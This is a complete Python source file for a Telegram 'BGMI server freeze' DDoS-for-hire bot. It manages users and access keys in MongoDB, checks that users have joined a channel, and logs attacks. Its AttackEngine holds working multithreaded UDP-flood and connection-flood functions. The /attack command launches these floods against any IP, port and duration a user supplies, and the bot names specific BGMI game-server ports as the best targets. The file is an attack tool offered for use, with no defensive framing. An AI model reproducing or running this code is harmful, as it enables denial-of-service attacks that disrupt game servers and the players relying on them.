#!/usr/bin/env python3
"""
BGMI SERVER FREEZE DDOS BOT - COMPLETE STANDALONE VERSION
"""

import asyncio
import logging
import socket
import threading
import subprocess
import time
import sys
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid, os, secrets, string
from dotenv import load_dotenv

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
DATABASE_NAME = os.getenv("DATABASE_NAME", "bgmi_ddos_bot")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
CHANNEL_ID = os.getenv("CHANNEL_ID", "")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "")
CHANNEL_INVITE = os.getenv("CHANNEL_INVITE_LINK", "")

BLOCKED_PORTS = {8700, 20000, 443}
BGMI_PORTS = {9031, 17500, 20001, 20002}
IST = timezone(timedelta(hours=5, minutes=30))
active_attacks: dict = {}
attack_threads: dict = {}


def utc_now():
    return datetime.now(timezone.utc)


def to_ist(dt):
    if dt is None: return None
    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(IST)


def fmt_ist(dt):
    if dt is None: return "N/A"
    return to_ist(dt).strftime("%d %b %Y, %I:%M %p IST")


def days_left(dt):
    if dt is None: return 0
    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
    return max(0, (dt - utc_now()).days)


def gen_key(hours, uses):
    rand = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
    return f"KEY-{rand}-{hours}H-{uses}U"


class AttackEngine:
    @staticmethod
    def udp_flood(target_ip, target_port, duration, threads=50, packet_size=1024):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            payload = b"A" * packet_size
            end_time = time.time() + duration

            def worker():
                while time.time() < end_time:
                    try:
                        sock.sendto(payload, (target_ip, target_port))
                    except:
                        pass

            thread_list = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join(timeout=duration + 5)
            sock.close()
        except Exception as e:
            logger.error(f"UDP flood error: {e}")

    @staticmethod
    def syn_flood(target_ip, target_port, duration, threads=50):
        try:
            end_time = time.time() + duration

            def worker():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.001)
                        try:
                            sock.connect((target_ip, target_port))
                        except:
                            pass
                        finally:
                            sock.close()
                    except:
                        pass

            thread_list = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join(timeout=duration + 5)
        except Exception as e:
            logger.error(f"SYN flood error: {e}")


class DB:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        d = self.client[DATABASE_NAME]
        self.users = d.users
        self.attacks = d.attacks
        self.keys = d.keys
        self._indexes()

    def _indexes(self):
        try:
            try:
                self.users.drop_index("user_id_1")
            except:
                pass
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.attacks.create_index([("user_id", ASCENDING)])
            self.keys.create_index([("key", ASCENDING)], unique=True)
            self.keys.create_index([("is_active", ASCENDING)])
        except Exception as e:
            logger.error(f"Index error: {e}")

    def get_user(self, uid):
        return self.users.find_one({"user_id": uid})

    def upsert_user(self, uid, username=None, first_name=None):
        user = self.get_user(uid)
        if user: return user
        doc = {
            "user_id": uid, "username": username, "first_name": first_name,
            "approved": False, "expires_at": None, "total_attacks": 0,
            "created_at": utc_now(), "joined_channel": False,
            "redeemed_keys": []
        }
        try:
            self.users.insert_one(doc)
        except pymongo.errors.DuplicateKeyError:
            doc = self.get_user(uid)
        return doc

    def is_approved(self, uid):
        u = self.get_user(uid)
        if not u or not u.get("approved"): return False
        exp = u.get("expires_at")
        if exp:
            if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
            if exp < utc_now(): return False
        return True

    def set_channel_status(self, uid, joined):
        self.users.update_one({"user_id": uid}, {"$set": {"joined_channel": joined}})

    def approve(self, uid, hours):
        exp = utc_now() + timedelta(hours=hours)
        user = self.get_user(uid)
        if user and user.get("approved") and user.get("expires_at"):
            old_exp = user["expires_at"]
            if old_exp.tzinfo is None: old_exp = old_exp.replace(tzinfo=timezone.utc)
            if old_exp > utc_now():
                exp = old_exp + timedelta(hours=hours)
        self.users.update_one(
            {"user_id": uid},
            {"$set": {"approved": True, "expires_at": exp}},
            upsert=True
        )
        return exp

    def all_users(self):
        return list(self.users.find())

    def create_key(self, hours, uses, by):
        key = gen_key(hours, uses)
        exp = utc_now() + timedelta(hours=hours)
        doc = {
            "key": key, "hours": hours, "max_uses": uses,
            "used_count": 0, "users_used": [],
            "created_by": by, "created_at": utc_now(),
            "expires_at": exp, "is_active": True
        }
        self.keys.insert_one(doc)
        return doc

    def redeem_key(self, key, uid):
        kd = self.keys.find_one({"key": key, "is_active": True})
        if not kd:
            return {"ok": False, "err": "Invalid or expired key."}
        exp = kd["expires_at"]
        if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
        if exp < utc_now():
            return {"ok": False, "err": "This key has expired."}
        if uid in kd.get("users_used", []):
            return {"ok": False, "err": "You already redeemed this key."}
        if kd["used_count"] >= kd["max_uses"]:
            return {"ok": False, "err": "Key has reached its maximum uses."}
        new_exp = self.approve(uid, kd["hours"])
        self.users.update_one(
            {"user_id": uid},
            {"$push": {"redeemed_keys": key}}
        )
        self.keys.update_one(
            {"_id": kd["_id"]},
            {"$inc": {"used_count": 1}, "$push": {"users_used": uid}}
        )
        return {"ok": True, "hours": kd["hours"], "expires_at": new_exp}

    def list_keys(self, active_only=True):
        q = {"is_active": True} if active_only else {}
        return list(self.keys.find(q).sort("created_at", -1))

    def deactivate_key(self, key):
        r = self.keys.update_one({"key": key}, {"$set": {"is_active": False}})
        return r.modified_count > 0

    def log_attack(self, uid, target_ip, target_port, duration, method, status="completed"):
        self.attacks.insert_one({
            "user_id": uid,
            "target_ip": target_ip,
            "target_port": target_port,
            "duration": duration,
            "method": method,
            "status": status,
            "timestamp": utc_now()
        })
        self.users.update_one(
            {"user_id": uid},
            {"$inc": {"total_attacks": 1}}
        )


db = None


def get_support_keyboard():
    keyboard = [
        [InlineKeyboardButton("OWNER", url="https://t.me/owner")],
        [InlineKeyboardButton("FEEDBACK", url="https://t.me/feedback")],
        [InlineKeyboardButton("PROOF", url="https://t.me/proof")],
    ]
    return InlineKeyboardMarkup(keyboard)


def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("Attack", callback_data="menu_attack"), InlineKeyboardButton("Stats", callback_data="menu_stats")],
        [InlineKeyboardButton("Redeem", callback_data="menu_redeem"), InlineKeyboardButton("Info", callback_data="menu_info")],
        [InlineKeyboardButton("Help", callback_data="menu_help")],
    ]
    return InlineKeyboardMarkup(keyboard)


def join_keyboard():
    kb = []
    if CHANNEL_INVITE:
        kb.append([InlineKeyboardButton("Join Channel", url=CHANNEL_INVITE)])
    kb.append([InlineKeyboardButton("Verified", callback_data="verify_join")])
    return InlineKeyboardMarkup(kb)


async def run_attack(update, ctx, uid, ip, port, dur, msg):
    try:
        try:
            await msg.edit_text(
                f"BGMI SERVER FREEZE ATTACK\n\n"
                f"Target: `{ip}:{port}`\n"
                f"Duration: `{dur}s`\n"
                f"Status: INITIALIZING...",
                parse_mode="Markdown"
            )
        except:
            pass

        active_attacks[uid] = {
            "start": time.time(),
            "end": time.time() + dur,
            "target": f"{ip}:{port}",
            "method": "udp"
        }

        if port == 9031:
            method = "udp"
            attack_method_name = "UDP Flood (Game Logic)"
        elif port == 20001:
            method = "syn"
            attack_method_name = "SYN Flood (Auth)"
        elif port == 17500:
            method = "udp"
            attack_method_name = "UDP Flood (Lobby)"
        else:
            method = "udp"
            attack_method_name = "UDP Flood"

        def execute_attack():
            try:
                if method == "udp":
                    AttackEngine.udp_flood(ip, port, dur, threads=80, packet_size=1024)
                elif method == "syn":
                    AttackEngine.syn_flood(ip, port, dur, threads=100)
            except Exception as e:
                logger.error(f"Attack error: {e}")

        attack_thread = threading.Thread(target=execute_attack, daemon=True)
        attack_thread.start()
        attack_threads[uid] = attack_thread

        for i in range(dur):
            remaining = dur - i
            progress = int((i / dur) * 100)
            bar = "#" * (progress // 5) + "-" * (20 - (progress // 5))

            try:
                await msg.edit_text(
                    f"BGMI MATCH FREEZE ATTACK\n\n"
                    f"Target: `{ip}:{port}`\n"
                    f"Remaining: `{remaining}s`\n"
                    f"Progress: `{bar}` {progress}%\n"
                    f"Method: {attack_method_name}",
                    parse_mode="Markdown"
                )
            except:
                pass

            await asyncio.sleep(1)

        attack_thread.join(timeout=5)
        db.log_attack(uid, ip, port, dur, method, "completed")

        try:
            await msg.edit_text(
                f"ATTACK COMPLETED\n\n"
                f"Target: `{ip}:{port}`\n"
                f"Duration: `{dur}s`\n"
                f"Method: {attack_method_name}\n"
                f"Status: SUCCESS",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
        except:
            pass

    except Exception as e:
        logger.error(f"Attack execution error: {e}")
        try:
            await msg.edit_text(
                f"ATTACK FAILED\n\n`{str(e)}`",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
        except:
            pass

    finally:
        if uid in active_attacks:
            del active_attacks[uid]
        if uid in attack_threads:
            del attack_threads[uid]


async def cmd_start(update, ctx):
    user = update.effective_user
    uid = user.id
    db.upsert_user(uid, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {user.first_name}!\n\n"
        f"BGMI Server Freeze DDoS Bot\n\n"
        f"Quick Start:\n"
        f"1. Join our channel\n"
        f"2. Redeem an access key\n"
        f"3. Launch attacks",
        parse_mode="Markdown",
        reply_markup=join_keyboard()
    )


async def check_joined(uid, ctx):
    if not CHANNEL_ID:
        return True
    try:
        member = await ctx.bot.get_chat_member(int(CHANNEL_ID), uid)
        is_member = member.status in ["member", "creator", "administrator", "restricted"]
        db.set_channel_status(uid, is_member)
        return is_member
    except:
        return False


async def cmd_redeem(update, ctx):
    uid = update.effective_user.id
    if not await check_joined(uid, ctx):
        await update.message.reply_text(
            "Please join our channel first!",
            reply_markup=join_keyboard()
        )
        return
    if len(ctx.args) < 1:
        await update.message.reply_text(
            f"REDEEM KEY\n\nUsage: `/redeem <KEY>`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    key = ctx.args[0].upper().strip()
    result = db.redeem_key(key, uid)
    if result["ok"]:
        await update.message.reply_text(
            f"KEY REDEEMED\n\n"
            f"Key: `{key}`\n"
            f"Duration: `{result['hours']} hours`\n"
            f"Expires: `{fmt_ist(result['expires_at'])}`\n\n"
            f"Ready! Use `/attack <IP> <PORT> <SECONDS>`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await update.message.reply_text(
            result["err"],
            reply_markup=get_support_keyboard()
        )


async def cmd_attack(update, ctx):
    uid = update.effective_user.id
    if not db.is_approved(uid):
        await update.message.reply_text(
            "NOT APPROVED\n\nUse `/redeem <KEY>` to get access.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    if uid in active_attacks and active_attacks[uid]["end"] > time.time():
        remaining = int(active_attacks[uid]["end"] - time.time())
        await update.message.reply_text(
            f"ATTACK IN PROGRESS\n\nTime Left: `{remaining}s`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    if len(ctx.args) != 3:
        await update.message.reply_text(
            f"ATTACK COMMAND\n\n"
            f"Usage: `/attack <IP> <PORT> <SECONDS>`\n\n"
            f"Example: `/attack 103.145.123.45 9031 120`\n\n"
            f"BGMI Ports:\n"
            f"`9031` - Match Server (BEST)\n"
            f"`17500` - Lobby\n"
            f"`20001` - Auth",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    ip = ctx.args[0]
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("Invalid IP Address", reply_markup=get_support_keyboard())
        return
    for part in ip.split('.'):
        if int(part) > 255:
            await update.message.reply_text("Invalid IP - each octet must be 0-255", reply_markup=get_support_keyboard())
            return
    try:
        port = int(ctx.args[1])
        if not (1 <= port <= 65535):
            raise ValueError
    except:
        await update.message.reply_text("Port must be 1-65535", reply_markup=get_support_keyboard())
        return
    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"Port {port} is blocked", reply_markup=get_support_keyboard())
        return
    try:
        dur = int(ctx.args[2])
        if not (1 <= dur <= 300):
            raise ValueError
    except:
        await update.message.reply_text("Duration must be 1-300 seconds", reply_markup=get_support_keyboard())
        return
    msg = await update.message.reply_text(
        f"INITIATING ATTACK\n\nTarget: `{ip}:{port}`\nDuration: `{dur}s`",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )
    asyncio.create_task(run_attack(update, ctx, uid, ip, port, dur, msg))


async def cmd_myinfo(update, ctx):
    uid = update.effective_user.id
    user = db.get_user(uid)
    if not user:
        await update.message.reply_text("User not found")
        return
    await update.message.reply_text(
        f"YOUR INFO\n\n"
        f"Username: `@{user.get('username', 'N/A')}`\n"
        f"ID: `{uid}`\n"
        f"Approved: {'Yes' if user.get('approved') else 'No'}\n"
        f"Expires: `{fmt_ist(user.get('expires_at'))}`\n"
        f"Total Attacks: `{user.get('total_attacks', 0)}`",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )


async def cmd_mystats(update, ctx):
    uid = update.effective_user.id
    attacks = list(db.attacks.find({"user_id": uid}).sort("timestamp", -1).limit(5))
    if not attacks:
        await update.message.reply_text("No attacks yet")
        return
    text = "YOUR RECENT ATTACKS\n\n"
    for i, att in enumerate(attacks, 1):
        text += f"{i}. `{att['target_ip']}:{att['target_port']}` | `{att['duration']}s`\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())


async def cmd_genkey(update, ctx):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("Admin only")
        return
    if len(ctx.args) < 2:
        await update.message.reply_text("Usage: `/genkey <HOURS> <MAX_USES>`", parse_mode="Markdown")
        return
    try:
        hours = int(ctx.args[0])
        uses = int(ctx.args[1])
        key_doc = db.create_key(hours, uses, uid)
        await update.message.reply_text(
            f"KEY GENERATED\n\nKey: `{key_doc['key']}`\nDuration: `{hours}h`\nMax Uses: `{uses}`",
            parse_mode="Markdown"
        )
    except:
        await update.message.reply_text("Invalid parameters")


async def cmd_keys(update, ctx):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("Admin only")
        return
    keys = db.list_keys(active_only=True)
    if not keys:
        await update.message.reply_text("No active keys")
        return
    text = "ACTIVE KEYS\n\n"
    for k in keys[:10]:
        text += f"`{k['key']}` | `{k['used_count']}/{k['max_uses']}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_users(update, ctx):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("Admin only")
        return
    users = db.all_users()
    approved = len([u for u in users if u.get("approved")])
    await update.message.reply_text(
        f"USER STATS\n\nTotal: `{len(users)}`\nApproved: `{approved}`\nUnapproved: `{len(users) - approved}`",
        parse_mode="Markdown"
    )


async def cmd_help(update, ctx):
    await update.message.reply_text(
        f"HELP\n\n"
        f"`/attack <IP> <PORT> <SECONDS>` - Attack\n"
        f"`/redeem <KEY>` - Redeem key\n"
        f"`/myinfo` - Account info\n"
        f"`/mystats` - Attack history",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )


async def cb_verify(update, ctx):
    query = update.callback_query
    uid = query.from_user.id
    if await check_joined(uid, ctx):
        try:
            await query.edit_message_text("VERIFIED\n\nUse `/start` to continue.", parse_mode="Markdown")
        except:
            pass
        await query.answer("Verified!")
    else:
        try:
            await query.edit_message_text("NOT VERIFIED\n\nJoin channel first!", reply_markup=join_keyboard())
        except:
            pass
        await query.answer("Join channel!", show_alert=True)


async def menu_callback(update, ctx):
    query = update.callback_query
    data = query.data

    if data == "menu_attack":
        await query.edit_message_text(
            f"ATTACK GUIDE\n\nCommand: `/attack <IP> <PORT> <SECONDS>`\n\nExample: `/attack 103.145.123.45 9031 120`",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    elif data == "menu_stats":
        uid = query.from_user.id
        user = db.get_user(uid)
        if user:
            await query.edit_message_text(
                f"YOUR STATS\n\nTotal Attacks: `{user.get('total_attacks', 0)}`\nExpires: `{fmt_ist(user.get('expires_at'))}`",
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
    elif data == "menu_redeem":
        await query.edit_message_text(
            f"REDEEM KEY\n\nCommand: `/redeem <KEY>`\n\nExample: `/redeem KEY-ABCD1234-24H-100U`",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    elif data == "menu_info":
        await query.edit_message_text(
            f"INFO\n\nCommand: `/myinfo`\n\nShows your account details.",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )
    elif data == "menu_help":
        await query.edit_message_text(
            f"HELP\n\n`/attack <IP> <PORT> <SECONDS>`\n`/redeem <KEY>`\n`/myinfo`\n`/mystats`",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )

    await query.answer()


async def err_handler(update, ctx):
    logger.error(f"Error: {ctx.error}")


def main():
    global db

    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN not set in .env file!")
        sys.exit(1)

    print("Connecting to MongoDB...")
    try:
        db = DB()
        print("MongoDB connected!")
    except Exception as e:
        print(f"MongoDB connection failed: {e}")
        sys.exit(1)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("myinfo", cmd_myinfo))
    app.add_handler(CommandHandler("mystats", cmd_mystats))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("keys", cmd_keys))
    app.add_handler(CommandHandler("users", cmd_users))

    app.add_handler(CallbackQueryHandler(cb_verify, pattern="^verify_join$"))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu_"))

    app.add_error_handler(err_handler)

    print("=" * 80)
    print("BGMI SERVER FREEZE DDOS BOT - STANDALONE VERSION")
    print("=" * 80)
    print(f"Bot Status: RUNNING")
    print(f"Admins: {ADMIN_IDS}")
    print(f"Attack Methods: UDP, SYN")
    print(f"BGMI Ports: 9031, 17500, 20001, 20002")
    print(f"Database: MongoDB")
    print("=" * 80)
    print("Bot is live!")
    print("=" * 80)

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )


if __name__ == "__main__":
    main()
